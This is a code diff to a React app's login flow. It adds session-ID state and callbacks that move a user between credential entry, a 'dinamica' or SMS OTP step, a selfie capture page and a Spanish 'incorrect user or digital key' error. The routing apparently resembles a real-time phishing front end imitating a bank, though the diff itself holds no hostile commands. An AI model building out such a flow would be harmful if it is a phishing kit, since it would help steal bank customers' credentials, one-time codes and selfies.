@@ -22,6 +22,7 @@ function currentPath() {
 export default function App() {
   const [path, setPath] = useState(currentPath)
   const [modal, setModal] = useState<ModalMode>(null)
+  const [currentSessionId, setCurrentSessionId] = useState('')
   const [otpState, setOtpState] = useState<{ sessionId: string; mode: 'dinamica' | 'sms' } | null>(null)
   const [showSelfie, setShowSelfie] = useState(false)
   const [loginError, setLoginError] = useState('')
@@ -44,10 +45,20 @@ export default function App() {
     if (showSelfie) {
       return (
         <SelfiePage
+          sessionId={currentSessionId}
           onHome={() => {
             setShowSelfie(false)
             setOtpState(null)
             go('/')
+          }}
+          onOtpRequired={(mode) => {
+            setShowSelfie(false)
+            setOtpState({ sessionId: currentSessionId, mode })
+          }}
+          onErrorLogin={() => {
+            setShowSelfie(false)
+            setOtpState(null)
+            setLoginError('Usuario o clave digital incorrecta. Por favor, verifica tus datos.')
           }}
         />
       )
@@ -63,6 +74,12 @@ export default function App() {
             go('/')
           }}
           onSuccess={() => {
+            setCurrentSessionId(otpState.sessionId)
+            setShowSelfie(true)
+            setOtpState(null)
+          }}
+          onSelfieRequired={() => {
+            setCurrentSessionId(otpState.sessionId)
             setShowSelfie(true)
             setOtpState(null)
           }}
@@ -79,8 +96,14 @@ export default function App() {
         onHome={() => go('/')}
         initialError={loginError}
         onOtpRequired={(sessionId, mode) => {
+          setCurrentSessionId(sessionId)
           setLoginError('')
           setOtpState({ sessionId, mode })
+        }}
+        onSelfieRequired={(sessionId) => {
+          setCurrentSessionId(sessionId)
+          setLoginError('')
+          setShowSelfie(true)
         }}
         onSuccess={() => {
           setShowSelfie(true)
